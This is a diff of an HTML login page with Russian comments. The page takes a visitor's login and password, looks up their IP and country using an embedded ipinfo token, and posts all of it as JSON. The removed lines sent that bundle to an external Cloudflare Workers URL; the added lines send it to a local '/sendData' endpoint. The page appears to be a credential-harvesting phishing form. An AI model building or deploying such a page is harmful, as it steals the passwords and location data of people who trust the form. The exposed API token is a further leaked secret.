@@ -49,7 +49,7 @@
   <div class="container">
     <h2>Введите данные для отправки</h2>
     <form id="loginForm">
-      <input type="text" name="login"    placeholder="Login"    required><br>
+      <input type="text" name="login" placeholder="Login" required><br>
       <input type="password" name="password" placeholder="Password" required><br>
       <button type="submit">Отправить</button>
     </form>
@@ -62,7 +62,6 @@
   </div>
 
   <script>
-    const WORKER_URL = 'https://mute-scene-f7f5.kamrantataloo69.workers.dev/';
     let clientIp = 'unknown', clientCountry = 'unknown';
 
     // Функция для флага
@@ -74,13 +73,13 @@
         .join('');
     }
 
-    // 1) Получаем IP
+    // Получаем IP
     fetch('https://api.ipify.org?format=json')
       .then(r => r.json())
       .then(json => {
         clientIp = json.ip;
         document.getElementById('ip').textContent = clientIp;
-        // 2) Получаем страну по IP (подставляем ваш токен)
+        // Получаем страну по IP (с использованием вашего токена)
         return fetch(`https://ipinfo.io/${clientIp}/json?token=12e7da7cd87750`);
       })
       .then(r => r.json())
@@ -95,21 +94,21 @@
         document.getElementById('country').textContent = '—';
       });
 
-    // 3) Обработка отправки формы
+    // Обработка отправки формы
     document.getElementById('loginForm').addEventListener('submit', async e => {
       e.preventDefault();
       const form = e.target;
       const payload = {
-        ip:       clientIp,
-        country:  clientCountry,
-        login:    form.login.value,
+        ip: clientIp,
+        country: clientCountry,
+        login: form.login.value,
         password: form.password.value
       };
 
-      const resp = await fetch(WORKER_URL, {
+      const resp = await fetch('/sendData', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(payload)
+        body: JSON.stringify(payload)
       });
 
       if (resp.ok) {
